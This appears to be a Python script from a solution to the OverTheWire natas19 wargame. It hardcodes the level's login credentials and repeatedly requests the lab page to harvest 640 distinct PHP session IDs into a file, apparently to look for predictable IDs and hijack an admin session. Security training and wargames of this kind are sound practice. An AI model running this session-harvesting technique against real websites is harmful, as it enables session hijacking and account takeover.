#!/usr/bin/python
import requests

auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
url = "http://natas19.natas.labs.overthewire.org?"

params = {
    "debug": "true",
    "username": "admin",
    "password": "asdf"
}

ids = []
while True:
    r = requests.get(url, auth=auth, params=params)

    php_id = r.cookies.get('PHPSESSID')

    if php_id not in ids:
        ids.append(php_id)

        print('ID:', php_id)
        print('Ids added:', len(ids))

    if len(ids) == 640:
        break

id_file = open("ids", "w")
id_file.write(str(ids))
print("Written ids to file..")